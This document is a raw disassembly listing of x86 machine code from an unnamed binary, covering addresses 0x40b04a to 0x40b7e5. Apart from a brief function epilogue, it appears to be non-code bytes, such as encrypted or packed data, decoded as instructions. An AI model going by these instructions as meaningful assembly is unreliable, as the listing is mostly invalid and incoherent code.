  40b04a:	bound  esi,QWORD PTR ds:0x70c9e571
  40b050:	ins    DWORD PTR es:[edi],dx
  40b051:	dec    eax
  40b052:	cdq    
  40b053:	mov    esp,0xca40aba9
  40b058:	mov    cl,0x9e
  40b05a:	mov    ds:0xa0648549,al
  40b05f:	or     al,0x14
  40b061:	jmp    FWORD PTR [ebp+0x35ca9b80]
  40b067:	jp     0x40b098
  40b069:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b06a:	cwde   
  40b06b:	int3   
  40b06c:	add    BYTE PTR [ecx+ebp*2-0x5c828e35],bh
  40b073:	xor    ebx,esi
  40b075:	push   ds
  40b076:	push   eax
  40b077:	(bad)  
  40b078:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b07a:	pop    ecx
  40b07b:	and    eax,ebx
  40b07d:	jnp    0x40b00c
  40b07f:	mov    eax,ds:0x9c2c656e
  40b084:	enter  0xeb24,0xc5
  40b088:	xchg   esi,eax
  40b089:	sub    BYTE PTR [esi+0x137628d8],ch
  40b08f:	jl     0x40b0aa
  40b091:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b092:	pop    eax
  40b093:	push   ebx
  40b094:	jge    0x40b0bf
  40b096:	or     DWORD PTR [eax],ebx
  40b098:	add    edi,DWORD PTR [edx+eiz*4-0x75]
  40b09c:	out    dx,eax
  40b09d:	sub    ch,BYTE PTR [ebp+0x3322f8eb]
  40b0a3:	sub    eax,0x18814207
  40b0a8:	mov    eax,edi
  40b0aa:	jnp    0x40b0e2
  40b0ac:	dec    edx
  40b0ad:	push   es
  40b0ae:	lods   eax,DWORD PTR ds:[esi]
  40b0af:	add    eax,0xa571a7c4
  40b0b4:	and    eax,0x4100eaf2
  40b0b9:	iret   
  40b0ba:	dec    edi
  40b0bb:	sbb    eax,0x44e7a0c7
  40b0c0:	or     esp,esi
  40b0c2:	(bad)  
  40b0c3:	cwde   
  40b0c4:	icebp  
  40b0c5:	popf   
  40b0c6:	xchg   DWORD PTR [edi-0x3f6ead4b],ebx
  40b0cc:	scas   al,BYTE PTR es:[edi]
  40b0cd:	and    bl,dh
  40b0cf:	out    dx,eax
  40b0d0:	sub    edi,DWORD PTR [eax+eiz*4+0x4e]
  40b0d4:	sbb    esp,0xffffffc0
  40b0d7:	fisub  DWORD PTR [esi]
  40b0d9:	mov    BYTE PTR [eax],ah
  40b0db:	adc    eax,0x8943461e
  40b0e0:	adc    bl,BYTE PTR [ebp+0x67]
  40b0e3:	or     BYTE PTR [ebp+0x218adfa0],al
  40b0e9:	aas    
  40b0ea:	cld    
  40b0eb:	ins    DWORD PTR es:[edi],dx
  40b0ec:	ret    0xe8d8
  40b0ef:	fild   WORD PTR [ebp-0x9]
  40b0f2:	shr    DWORD PTR [esi],cl
  40b0f4:	shl    BYTE PTR [ecx+0x1c1eb4e],1
  40b0fa:	or     DWORD PTR [edx-0x361fe3be],0xd036efa2
  40b104:	test   dl,ch
  40b106:	push   cs
  40b107:	out    0xbd,eax
  40b109:	cmp    dh,BYTE PTR [eax+edx*4-0xaf3f08a]
  40b110:	mov    bh,0xc7
  40b112:	loopne 0x40b15c
  40b114:	sub    DWORD PTR [edx],ebx
  40b116:	inc    ebp
  40b117:	imul   DWORD PTR [ebp+0x3513f216]
  40b11d:	mov    BYTE PTR [ebp-0x24],al
  40b120:	hlt    
  40b121:	aad    0x28
  40b123:	leave  
  40b124:	scas   al,BYTE PTR es:[edi]
  40b125:	sub    eax,DWORD PTR [ebp-0x74]
  40b128:	pushf  
  40b129:	call   0xa983:0xb645b727
  40b130:	ins    BYTE PTR es:[edi],dx
  40b131:	jo     0x40b11a
  40b133:	push   ebx
  40b134:	sbb    eax,0x250b2c4d
  40b139:	add    dh,BYTE PTR [esi]
  40b13b:	clc    
  40b13c:	mov    esp,0xe9c2cb19
  40b141:	push   esp
  40b142:	jmp    0xb81e:0x318443e2
  40b149:	add    BYTE PTR [edx],cl
  40b14b:	mov    esp,0x84776479
  40b150:	das    
  40b151:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b152:	and    al,cl
  40b154:	cmp    eax,0xfbd5b1f5
  40b159:	not    DWORD PTR [esi+0x35]
  40b15c:	jae    0x40b16b
  40b15e:	jg     0x40b19a
  40b160:	mov    ah,0x3a
  40b162:	stos   BYTE PTR es:[edi],al
  40b163:	mov    esp,0x56a0940c
  40b168:	hlt    
  40b169:	xchg   edx,eax
  40b16a:	out    0x99,al
  40b16c:	cmc    
  40b16d:	lods   al,BYTE PTR ds:[esi]
  40b16e:	jg     0x40b124
  40b170:	push   eax
  40b171:	in     al,dx
  40b172:	inc    ecx
  40b173:	jmp    0x40b1c6
  40b175:	xchg   BYTE PTR [eax-0x7fdf83d8],bh
  40b17b:	out    0xc,eax
  40b17d:	aad    0xe3
  40b17f:	xchg   esi,eax
  40b180:	mov    BYTE PTR [edx+0x1a],cl
  40b183:	int    0x34
  40b185:	js     0x40b1ac
  40b187:	sahf   
  40b188:	pop    edi
  40b189:	fwait
  40b18a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b18b:	dec    eax
  40b18c:	test   eax,0x1ddb5c0
  40b191:	pop    DWORD PTR [esi-0x718f0848]
  40b197:	xchg   ebx,eax
  40b198:	push   edi
  40b199:	mov    al,BYTE PTR [ecx]
  40b19b:	repnz retf 
  40b19d:	push   es
  40b19e:	add    DWORD PTR [edi+0x2d],eax
  40b1a1:	test   DWORD PTR [eax-0x2b],0x9de749ed
  40b1a8:	inc    ebx
  40b1a9:	inc    ebx
  40b1aa:	stos   DWORD PTR es:[edi],eax
  40b1ab:	cwde   
  40b1ac:	xchg   edi,eax
  40b1ad:	pusha  
  40b1ae:	mov    ds:0x852ec74b,al
  40b1b3:	test   DWORD PTR [edx+0x6e1aa324],ebx
  40b1b9:	mov    bl,0xde
  40b1bc:	xor    BYTE PTR [edi+0x5c],ah
  40b1bf:	rol    DWORD PTR [ebp-0x1c],0x66
  40b1c3:	sub    dh,BYTE PTR [ebx-0x17]
  40b1c6:	mov    esi,edx
  40b1c8:	inc    ebx
  40b1c9:	sub    eax,0xd9262286
  40b1ce:	and    BYTE PTR [esi],bl
  40b1d0:	scas   eax,DWORD PTR es:[edi]
  40b1d1:	and    dl,BYTE PTR ss:[ebx+0x19e8ce8a]
  40b1d8:	lds    eax,FWORD PTR [edi-0x3ebc4f7a]
  40b1de:	xor    eax,0xa109a35c
  40b1e3:	cmp    eax,ebp
  40b1e5:	ss js  0x40b226
  40b1e8:	xlat   BYTE PTR ds:[ebx]
  40b1e9:	inc    ebx
  40b1ea:	sbb    BYTE PTR [ebx-0x74d1088e],bl
  40b1f0:	xchg   esi,eax
  40b1f1:	adc    ch,ah
  40b1f3:	ins    DWORD PTR es:[edi],dx
  40b1f4:	sbb    al,0x76
  40b1f6:	inc    edx
  40b1f7:	das    
  40b1f8:	lds    esp,FWORD PTR [ebx-0x10]
  40b1fb:	repnz gs and bl,bh
  40b1ff:	xchg   edx,eax
  40b200:	out    0x8e,al
  40b202:	push   esp
  40b203:	stos   DWORD PTR es:[edi],eax
  40b204:	gs jmp 0x2090:0x2ec6c132
  40b20c:	into   
  40b20d:	xchg   esi,eax
  40b20e:	xchg   ebx,eax
  40b20f:	sub    BYTE PTR [ebp+0x7ad161c1],0x7e
  40b216:	js     0x40b22d
  40b218:	adc    BYTE PTR [esi],0xd
  40b21b:	xor    esi,esi
  40b21d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b21e:	ins    DWORD PTR es:[edi],dx
  40b21f:	sbb    bh,BYTE PTR [edx+0x48]
  40b222:	mov    cl,0x68
  40b224:	jl     0x40b236
  40b226:	(bad)
  40b229:	shr    ebp,0x58
  40b22c:	xchg   BYTE PTR [esi],ah
  40b22e:	or     edx,ecx
  40b230:	xchg   ebx,eax
  40b231:	sub    dl,dl
  40b233:	pop    esi
  40b234:	xchg   esi,eax
  40b235:	jge    0x40b200
  40b237:	loop   0x40b28b
  40b239:	js     0x40b231
  40b23b:	fldenv [esi+eax*2]
  40b23e:	and    edx,DWORD PTR ds:0xada31729
  40b244:	xor    DWORD PTR [ecx+0x5d],esp
  40b247:	xchg   edx,eax
  40b248:	pop    esi
  40b249:	arpl   si,di
  40b24b:	fisttp DWORD PTR [eax-0x1d9bf335]
  40b251:	mov    ebx,0x980dc9c2
  40b256:	push   ss
  40b257:	mov    esp,0x98c527c1
  40b25c:	or     BYTE PTR [eax+esi*2+0x61],bl
  40b260:	inc    eax
  40b261:	mov    ebx,0x1b54a32b
  40b266:	jmp    0xbc4051a9
  40b26b:	adc    dh,bh
  40b26d:	mov    ebx,0x937f1140
  40b272:	sbb    BYTE PTR [edi+0x35],bl
  40b275:	retf   
  40b276:	test   BYTE PTR [esi-0x61],0x1a
  40b27a:	aad    0xdf
  40b27c:	add    eax,0xd7c6acfe
  40b281:	inc    ecx
  40b282:	inc    esi
  40b283:	and    BYTE PTR [eax],ch
  40b285:	pop    ecx
  40b286:	cmp    BYTE PTR [eax-0x6f7c8ca0],bh
  40b28c:	cli    
  40b28d:	stos   DWORD PTR es:[edi],eax
  40b28e:	les    ecx,FWORD PTR [edi+0x6a]
  40b291:	pop    eax
  40b292:	lods   al,BYTE PTR ds:[esi]
  40b293:	sti    
  40b294:	bound  ebx,QWORD PTR [ebp-0x76683443]
  40b29a:	mov    edi,0x60dd0270
  40b2a0:	loope  0x40b30a
  40b2a2:	or     al,0x86
  40b2a4:	mov    BYTE PTR [esi+0x70f41fc8],dl
  40b2aa:	sbb    ah,BYTE PTR [ebp*1-0x341afc0c]
  40b2b1:	push   ss
  40b2b2:	(bad)  
  40b2b3:	or     DWORD PTR [edi-0x3],esi
  40b2b6:	repnz idiv DWORD PTR [eax-0x58]
  40b2ba:	cmp    eax,0x82927a76
  40b2bf:	jmp    0x40b5d8
  40b2c4:	rol    al,cl
  40b2c6:	(bad)  
  40b2c7:	leave  
  40b2c8:	fcmove st,st(1)
  40b2ca:	rcl    edi,1
  40b2cc:	pop    ss
  40b2cd:	mov    ecx,0x6ef9b132
  40b2d2:	pop    edi
  40b2d3:	ror    dh,cl
  40b2d5:	mov    bh,BYTE PTR [eax+0x78]
  40b2d8:	je     0x40b358
  40b2da:	js     0x40b354
  40b2dc:	add    BYTE PTR [ebp+0x40],cl
  40b2df:	inc    eax
  40b2e0:	xchg   esi,eax
  40b2e1:	and    al,al
  40b2e3:	pop    eax
  40b2e4:	mov    WORD PTR [ebx-0x22ee4b21],ss
  40b2ea:	sub    DWORD PTR [ebx+eax*8],esp
  40b2ed:	fsub   st(2),st
  40b2ef:	sub    esp,DWORD PTR ds:0x144c65b6
  40b2f5:	shr    DWORD PTR [edx-0x6d],0x46
  40b2f9:	dec    ecx
  40b2fa:	cmp    al,0x9
  40b2fc:	inc    ebp
  40b2fd:	jb     0x40b288
  40b2ff:	test   BYTE PTR [edi-0x73],cl
  40b302:	in     al,0x31
  40b304:	and    bl,BYTE PTR [eax]
  40b306:	dec    ebp
  40b307:	stc    
  40b308:	cli    
  40b309:	sbb    eax,0x8054194a
  40b30e:	lods   al,BYTE PTR ds:[esi]
  40b30f:	dec    esi
  40b310:	leave  
  40b311:	cmp    al,0xf5
  40b313:	push   0x69c6d7e5
  40b318:	shr    ecx,cl
  40b31a:	int3   
  40b31b:	popa   
  40b31c:	mov    edx,DWORD PTR [esi-0x773963c8]
  40b322:	das    
  40b323:	inc    edx
  40b324:	popa   
  40b325:	inc    ebp
  40b326:	xor    al,0xb4
  40b328:	dec    eax
  40b329:	cmc    
  40b32a:	or     BYTE PTR [ebp+0x4],0xce
  40b32e:	cli    
  40b32f:	xlat   BYTE PTR ds:[ebx]
  40b330:	adc    eax,0x9d6d26a1
  40b335:	mov    esp,0xde6f2065
  40b33a:	aam    0xb6
  40b33c:	sub    eax,0x8d6f3d68
  40b341:	int    0xd9
  40b343:	lock mov al,0xe3
  40b346:	pop    edx
  40b347:	repnz ins DWORD PTR es:[edi],dx
  40b349:	mov    ds:0x955f0290,al
  40b34e:	fisubr WORD PTR [esi+0x1b]
  40b351:	sub    bh,BYTE PTR [ebx+0x51]
  40b354:	stos   BYTE PTR es:[edi],al
  40b355:	scas   eax,DWORD PTR es:[edi]
  40b356:	adc    al,0x75
  40b358:	mov    ds:0x10ecb963,eax
  40b35d:	cwde   
  40b35e:	or     al,0x24
  40b360:	sub    DWORD PTR [edx+0x57ed0c8a],ecx
  40b366:	(bad)  
  40b367:	mov    esi,0x14b92f54
  40b36c:	dec    esi
  40b36d:	inc    esi
  40b36f:	pusha  
  40b370:	pop    edi
  40b371:	les    esi,FWORD PTR [edx-0x7c]
  40b374:	ror    BYTE PTR [edx-0x3b777dd9],0x29
  40b37b:	mov    al,ds:0x73724a8a
  40b380:	ror    DWORD PTR [ebx],1
  40b382:	xor    eax,0xaa3b8058
  40b387:	iret   
  40b388:	fdiv   QWORD PTR [eax+0x4a]
  40b38b:	and    DWORD PTR [ebx+0x65],eax
  40b38e:	arpl   WORD PTR [esi+0x4],sp
  40b391:	leave  
  40b392:	adc    DWORD PTR [edx+0x1d],ecx
  40b395:	loopne 0x40b343
  40b397:	cwde   
  40b398:	js     0x40b36a
  40b39a:	into   
  40b39b:	mov    edi,0xc5acfb48
  40b3a1:	call   0xb938:0x5ce329d9
  40b3a8:	push   ebx
  40b3a9:	lds    eax,FWORD PTR [edi-0x64]
  40b3ac:	in     eax,0x7f
  40b3ae:	in     al,dx
  40b3af:	rcl    BYTE PTR [edi+0x20],0xfd
  40b3b3:	in     al,0x47
  40b3b5:	ds jmp 0x40b3ea
  40b3b8:	ja     0x40b435
  40b3ba:	push   0xffffffc2
  40b3bc:	jmp    0x30e7:0x51528a19
  40b3c3:	jb     0x40b3dd
  40b3c5:	fiadd  WORD PTR [edx+0xad1bbbb]
  40b3cb:	in     eax,dx
  40b3cc:	stos   BYTE PTR es:[edi],al
  40b3cd:	lds    ebx,FWORD PTR [edi-0x2]
  40b3d0:	add    bh,ch
  40b3d2:	and    esi,DWORD PTR [edx]
  40b3d4:	icebp  
  40b3d5:	pop    edi
  40b3d6:	hlt    
  40b3d7:	ret    
  40b3d8:	cwde   
  40b3d9:	int    0xdb
  40b3db:	mov    WORD PTR [edi],gs
  40b3dd:	les    edx,FWORD PTR [edi-0x2d94f0e3]
  40b3e3:	sbb    ebp,DWORD PTR [edi]
  40b3e5:	sub    ch,BYTE PTR [esi+0x38226ea]
  40b3eb:	inc    edx
  40b3ec:	fwait
  40b3ed:	lock sti 
  40b3ef:	xchg   ebp,eax
  40b3f0:	daa    
  40b3f1:	das    
  40b3f2:	test   BYTE PTR [esi+0x44ca556b],dl
  40b3f8:	xor    DWORD PTR [esi],eax
  40b3fa:	fcomp  st(4)
  40b3fc:	mov    ebp,0xef984559
  40b401:	push   ebx
  40b402:	xchg   ecx,eax
  40b403:	push   0x530c3a9b
  40b408:	cmp    eax,0xd81b9a72
  40b40d:	test   al,0x3b
  40b40f:	sbb    al,0xb7
  40b411:	jmp    0x9021f8b
  40b416:	call   0x48d6fe61
  40b41b:	inc    edx
  40b41c:	lea    esi,[ecx+0x4ccfcdd7]
  40b422:	cwde   
  40b423:	fdivr  QWORD PTR [ecx+0x74]
  40b426:	cli    
  40b427:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b428:	push   0x8ca08ee7
  40b42d:	sbb    al,0xbb
  40b42f:	stos   BYTE PTR es:[edi],al
  40b430:	add    ah,dh
  40b432:	je     0x40b404
  40b434:	push   edi
  40b435:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b436:	xchg   edi,eax
  40b437:	jne    0x40b3e6
  40b439:	mov    al,0xbc
  40b43b:	aaa    
  40b43c:	cmp    ch,dl
  40b43e:	mov    DWORD PTR fs:[esi+0x43],eax
  40b442:	inc    edi
  40b443:	mov    ecx,DWORD PTR [edi]
  40b445:	mov    bh,0x7a
  40b447:	dec    esi
  40b448:	pop    ebp
  40b449:	add    eax,0x9f3813ae
  40b44e:	xchg   ebp,eax
  40b44f:	jo     0x40b3d4
  40b451:	imul   ecx,DWORD PTR [eax+0x23],0x67
  40b455:	or     DWORD PTR [edi+eax*4-0x15904ebc],edi
  40b45c:	push   esi
  40b45d:	mov    edx,0xfd1c78d1
  40b462:	arpl   bx,bp
  40b464:	xor    eax,0x58c835c0
  40b469:	jge    0x40b480
  40b46b:	inc    edi
  40b46c:	fisub  WORD PTR [esp-0x230032f4]
  40b473:	xor    al,0xbd
  40b475:	mov    dl,0x58
  40b477:	ins    DWORD PTR es:[edi],dx
  40b478:	leave  
  40b479:	pop    edi
  40b47a:	mov    bh,0xbf
  40b47c:	xor    al,0x3c
  40b47e:	inc    eax
  40b47f:	ret    0xa010
  40b482:	cmp    dh,bh
  40b484:	xchg   ebp,eax
  40b485:	or     esp,DWORD PTR [esi-0x57]
  40b488:	loop   0x40b476
  40b48a:	div    DWORD PTR [eax+ecx*2]
  40b48d:	mov    ah,0x9e
  40b48f:	pshufw mm3,QWORD PTR [edi-0x1a],0x77
  40b494:	mov    eax,0x9562e871
  40b499:	inc    ebp
  40b49a:	xor    al,0x25
  40b49c:	inc    esi
  40b49d:	cmp    eax,DWORD PTR [edi+0x39ec4323]
  40b4a3:	or     eax,0xb94fc69c
  40b4a8:	fist   WORD PTR [ecx+eiz*1+0x6653acc0]
  40b4af:	dec    ebx
  40b4b0:	mov    ds:0xd96683b7,eax
  40b4b5:	leave  
  40b4b6:	bound  edx,QWORD PTR [eax+0x79]
  40b4b9:	sahf   
  40b4ba:	out    dx,eax
  40b4bb:	push   eax
  40b4bc:	xor    ecx,DWORD PTR [ebx-0x4c]
  40b4bf:	test   al,0x1e
  40b4c1:	rcl    BYTE PTR [ecx-0x60],cl
  40b4c4:	xor    eax,0x9d2bfb7a
  40b4c9:	cmp    al,BYTE PTR [ebx]
  40b4cb:	pop    es
  40b4cc:	jge    0x40b4ac
  40b4ce:	or     al,0x43
  40b4d0:	iret   
  40b4d1:	dec    esp
  40b4d2:	shl    BYTE PTR [edx],1
  40b4d4:	(bad)  
  40b4d5:	mov    al,ds:0x9dc92640
  40b4da:	and    eax,0x8e0d4b0a
  40b4df:	int3   
  40b4e0:	push   0xf4fa7cc
  40b4e5:	imul   esp,DWORD PTR [edx],0x1382402
  40b4eb:	adc    esp,DWORD PTR [ebx+0x4f23d7eb]
  40b4f1:	sub    dl,0x96
  40b4f4:	into   
  40b4f5:	jmp    0x8e91:0x947f9bbf
  40b4fc:	cmp    BYTE PTR [ebx-0x6],bh
  40b4ff:	es pop esi
  40b501:	fnstenv [esi]
  40b503:	and    BYTE PTR [esi],ch
  40b505:	clc    
  40b506:	dec    ebp
  40b507:	mov    al,0x15
  40b509:	and    al,al
  40b50b:	add    eax,0xe85d0517
  40b510:	js     0x40b4a9
  40b512:	xchg   ebp,eax
  40b513:	sbb    al,BYTE PTR [ebp+0x4e]
  40b516:	add    al,0xb7
  40b518:	jmp    0x40b541
  40b51a:	push   0xffffffc3
  40b51c:	shl    BYTE PTR [ebp-0x70],cl
  40b51f:	dec    ebp
  40b520:	pushf  
  40b521:	jae    0x40b4a7
  40b523:	sbb    DWORD PTR [ecx+0x7ede0cce],edx
  40b529:	out    0x25,eax
  40b52b:	pop    edi
  40b52c:	xchg   esp,eax
  40b52d:	call   0x8b4b2b59
  40b532:	imul   eax,eax,0xf50c499b
  40b538:	xchg   ebp,eax
  40b539:	or     BYTE PTR fs:[edi-0x6],ch
  40b53d:	xchg   edx,eax
  40b53e:	or     esp,edx
  40b540:	or     eax,0xb9477589
  40b545:	repz in al,0xc7
  40b548:	inc    edi
  40b549:	fcmovnu st,st(0)
  40b54b:	mov    bh,0x6
  40b54d:	daa    
  40b54e:	or     BYTE PTR [ebp+0x79],ah
  40b551:	dec    esp
  40b552:	mov    ecx,0xc9ed130c
  40b557:	or     eax,0x9f1f4176
  40b55c:	inc    esi
  40b55d:	icebp  
  40b55e:	data16 je 0x40b596
  40b561:	inc    edi
  40b562:	clc    
  40b563:	enter  0xaf9,0x47
  40b567:	into   
  40b568:	nop
  40b569:	mov    ah,0x63
  40b56b:	leave  
  40b56c:	call   0xab2f:0x8cbb34b2
  40b573:	addr16 push ebp
  40b575:	loop   0x40b56e
  40b577:	outs   dx,DWORD PTR ds:[esi]
  40b578:	cmc    
  40b579:	fsubrp st(0),st
  40b57b:	push   0x55fd3d36
  40b580:	sbb    DWORD PTR [edi-0x4c3d2a03],ecx
  40b586:	scas   eax,DWORD PTR es:[edi]
  40b587:	pop    ebp
  40b588:	ins    DWORD PTR es:[edi],dx
  40b589:	ins    BYTE PTR es:[edi],dx
  40b58a:	inc    ebx
  40b58b:	stos   DWORD PTR es:[edi],eax
  40b58c:	cmp    DWORD PTR ds:[edx],edx
  40b58f:	sub    esi,DWORD PTR [ebx-0x2b]
  40b592:	jle    0x40b5c0
  40b594:	fisub  WORD PTR ds:0xeb903f30
  40b59a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b59b:	fbstp  TBYTE PTR [ecx]
  40b59d:	cwd    
  40b59f:	jg     0x40b586
  40b5a1:	retf   
  40b5a2:	adc    al,0x4a
  40b5a4:	psubusb mm1,QWORD PTR [edi]
  40b5a7:	ret    
  40b5a8:	and    BYTE PTR [eax+0x698a6c0f],0x67
  40b5af:	ficomp DWORD PTR [ebp-0x1a]
  40b5b2:	and    DWORD PTR [edi-0x7803334e],eax
  40b5b8:	loop   0x40b560
  40b5ba:	test   DWORD PTR [ebp+0x168856b1],edx
  40b5c0:	add    al,dl
  40b5c2:	jmp    0x40b60d
  40b5c4:	mov    ds:0xe6e7e35,eax
  40b5c9:	inc    eax
  40b5ca:	cli    
  40b5cb:	outs   dx,DWORD PTR ds:[esi]
  40b5cc:	push   cs
  40b5cd:	sbb    al,0x46
  40b5cf:	add    al,0x63
  40b5d1:	aaa    
  40b5d2:	push   ss
  40b5d3:	pop    esi
  40b5d4:	cmc    
  40b5d5:	hlt    
  40b5d6:	fwait
  40b5d7:	stos   BYTE PTR es:[edi],al
  40b5d8:	je     0x40b5f5
  40b5de:	mov    eax,DWORD PTR [ebp-0x1c]
  40b5e1:	or     DWORD PTR [eax],0x60751c9d
  40b5e7:	mov    eax,DWORD PTR [ebp-0x8]
  40b5ea:	xor    eax,ecx
  40b5ec:	add    eax,esi
  40b5ee:	pop    edi
  40b5ef:	pop    esi
  40b5f0:	pop    ebx
  40b5f1:	leave  
  40b5f2:	ret    0x4
  40b5f5:	mov    eax,DWORD PTR [ebp-0xc]
  40b5f8:	add    eax,DWORD PTR [ebp-0x18]
  40b5fb:	jmp    0x40b914
  40b600:	leave  
  40b601:	xlat   BYTE PTR ds:[ebx]
  40b602:	ret    
  40b603:	rcl    cl,0xd4
  40b606:	leave  
  40b607:	fldcw  WORD PTR [esi+0xbccd584]
  40b60d:	mov    bh,0xa7
  40b60f:	or     edx,0x7478788f
  40b615:	jle    0x40b68f
  40b617:	js     0x40b59d
  40b619:	push   edx
  40b61a:	mov    esi,0x405ccb46
  40b61f:	int3   
  40b620:	mov    al,BYTE PTR [ebx+eax*8]
  40b623:	mov    eax,0x4f8d5eea
  40b628:	pop    ecx
  40b629:	pop    edx
  40b62a:	push   esp
  40b62b:	rcl    BYTE PTR [ecx-0x1d],1
  40b62e:	ds or  al,0xe2
  40b631:	ins    BYTE PTR es:[edi],dx
  40b632:	ss call 0x70b:0x19cdc574
  40b63a:	arpl   WORD PTR [ecx+0xa],bp
  40b63d:	into   
  40b63e:	dec    ebp
  40b63f:	xlat   BYTE PTR ds:[ebx]
  40b640:	sub    edx,eax
  40b642:	jmp    0x27a5b535
  40b647:	ret    0x7092
  40b64a:	xchg   edx,eax
  40b64b:	ds clc 
  40b64d:	sub    BYTE PTR [edi-0x2adfa724],al
  40b653:	cmp    dh,BYTE PTR [eax-0x48]
  40b656:	xchg   DWORD PTR [edi+ebp*2+0x1b],ebx
  40b65a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b65b:	test   eax,0x74d3be90
  40b660:	push   edx
  40b661:	int3   
  40b662:	xor    ebx,ebp
  40b664:	daa    
  40b665:	jecxz  0x40b691
  40b667:	add    DWORD PTR [eax-0x34813044],0x5703b0c9
  40b671:	xchg   edx,eax
  40b672:	or     DWORD PTR [ebp-0x49],esi
  40b675:	out    dx,al
  40b676:	adc    ch,BYTE PTR [esi+0x168956c7]
  40b67c:	mov    edx,0x10f28435
  40b681:	jae    0x40b663
  40b683:	jmp    0x778e010b
  40b688:	cmp    eax,0x4489ff3c
  40b68d:	pop    ds
  40b68e:	fdiv   DWORD PTR [ebp-0x2b]
  40b691:	out    0x59,al
  40b693:	jmp    0x3877:0x4b504703
  40b69a:	mov    edx,0xf73b7986
  40b69f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b6a0:	es xchg esi,eax
  40b6a2:	aaa    
  40b6a3:	or     BYTE PTR [ebx+0x56],al
  40b6a6:	mov    bh,0x49
  40b6a8:	mov    eax,0x21f59dfe
  40b6ad:	push   cs
  40b6ae:	mov    ds:0x8bd42aca,eax
  40b6b3:	(bad)  [edi]
  40b6b5:	sub    eax,DWORD PTR [ebp+ebx*1+0x5c139685]
  40b6bc:	gs sbb al,0x1f
  40b6bf:	mov    eax,0x93bb0e50
  40b6c4:	out    dx,al
  40b6c5:	aas    
  40b6c6:	les    ebp,FWORD PTR [eax+0xc]
  40b6c9:	mov    WORD PTR gs:[ecx+0x3a],?
  40b6cd:	lock and edx,DWORD PTR [edx+edx*8-0x54de7d75]
  40b6d5:	sub    esi,DWORD PTR [edi+eiz*4-0x7b1f1361]
  40b6dc:	fucomip st,st(0)
  40b6de:	mov    bl,0xc8
  40b6e0:	sti    
  40b6e1:	cmp    bh,BYTE PTR ds:0x8313f0e
  40b6e7:	xor    BYTE PTR [edx],dh
  40b6e9:	shr    BYTE PTR [ebx+edi*2],0x64
  40b6ed:	dec    edi
  40b6ee:	or     al,BYTE PTR [edi-0x4e]
  40b6f1:	pop    edi
  40b6f2:	add    esi,DWORD PTR [edx]
  40b6f4:	(bad)  
  40b6f5:	ins    BYTE PTR es:[edi],dx
  40b6f6:	mov    al,0xe6
  40b6f8:	mov    ds:0xfe77e16d,al
  40b6fd:	push   ds
  40b6fe:	inc    ebx
  40b6ff:	xor    ch,BYTE PTR [esp+eax*1]
  40b702:	mov    gs:0xb2386329,eax
  40b708:	daa    
  40b709:	xchg   ebx,eax
  40b70a:	sub    BYTE PTR [edx],dh
  40b70c:	mov    ecx,0x770a196
  40b711:	push   eax
  40b712:	call   0xfd5b:0x836a97c9
  40b719:	enter  0x59c9,0xba
  40b71d:	mov    ds:0x4f435d52,al
  40b722:	imul   edi,DWORD PTR [eax-0x53fa46b7],0xfaa94e35
  40b72c:	add    bh,dl
  40b72e:	cmp    al,0xa1
  40b730:	loope  0x40b77f
  40b732:	not    BYTE PTR [edx-0x5]
  40b735:	dec    ebp
  40b736:	jne    0x40b78e
  40b738:	push   es
  40b739:	hlt    
  40b73a:	lods   al,BYTE PTR ds:[esi]
  40b73b:	repz mov ds:0x98928a9e,eax
  40b741:	(bad)  
  40b743:	dec    eax
  40b744:	scas   al,BYTE PTR es:[edi]
  40b745:	dec    BYTE PTR [edi+0x55]
  40b748:	or     eax,0xcd19e1b1
  40b74d:	jg     0x40b743
  40b74f:	push   0xffffff9b
  40b751:	cmp    eax,0xe75ad253
  40b756:	les    edx,FWORD PTR [ebx+0x4]
  40b759:	cmp    al,0x4a
  40b75b:	fsubr  DWORD PTR [eax]
  40b75d:	push   ecx
  40b75e:	enter  0x6ee,0xf9
  40b762:	mov    DWORD PTR ds:0xac91a32d,edi
  40b768:	jge    0x40b75b
  40b76a:	arpl   WORD PTR [eax+0x1719481d],sp
  40b770:	psubsw mm0,QWORD PTR [ebx]
  40b773:	mov    bh,BYTE PTR [edi]
  40b775:	pusha  
  40b776:	xor    al,0xd1
  40b778:	sub    cl,BYTE PTR [ebp+0x4705ae25]
  40b77e:	shr    BYTE PTR [ecx+0x29],0x7e
  40b782:	retf   0xd8b9
  40b785:	add    ebx,ecx
  40b787:	daa    
  40b788:	inc    edi
  40b789:	mov    ds:0xa6af36c4,al
  40b78e:	dec    eax
  40b78f:	mul    DWORD PTR [esi+0x49]
  40b792:	aad    0x80
  40b794:	adc    eax,0xc02ac6e5
  40b799:	cmp    DWORD PTR [eax+0x4f496872],0xffffffac
  40b7a0:	push   esi
  40b7a1:	jbe    0x40b754
  40b7a3:	sbb    ebp,DWORD PTR [ebx-0x47]
  40b7a6:	sbb    DWORD PTR [edx-0x29],ecx
  40b7a9:	xor    BYTE PTR [ebx-0x72],ch
  40b7ac:	clc    
  40b7ad:	push   ecx
  40b7ae:	leave  
  40b7af:	data16 stc 
  40b7b1:	jmp    0x990a:0xf6a8f160
  40b7b8:	mov    bl,0x57
  40b7ba:	bound  eax,QWORD PTR [eax]
  40b7bc:	inc    esp
  40b7bd:	add    ah,BYTE PTR [esi]
  40b7bf:	adc    al,0x73
  40b7c1:	leave  
  40b7c2:	and    dh,bh
  40b7c4:	dec    ecx
  40b7c5:	lea    edi,[ebx+ecx*2-0x59296a86]
  40b7cc:	call   0xd8bd:0x1c055991
  40b7d3:	sbb    BYTE PTR [ebx],0x27
  40b7d6:	pop    eax
  40b7d7:	or     al,0x2
  40b7d9:	dec    esp
  40b7da:	pop    esp
  40b7db:	mov    dl,0xd2
  40b7dd:	cwde   
  40b7de:	cmc    
  40b7df:	pop    edx
  40b7e0:	enter  0x11c0,0x61
  40b7e4:	ins    DWORD PTR es:[edi],dx
  40b7e5:	cmp    al,0x2b
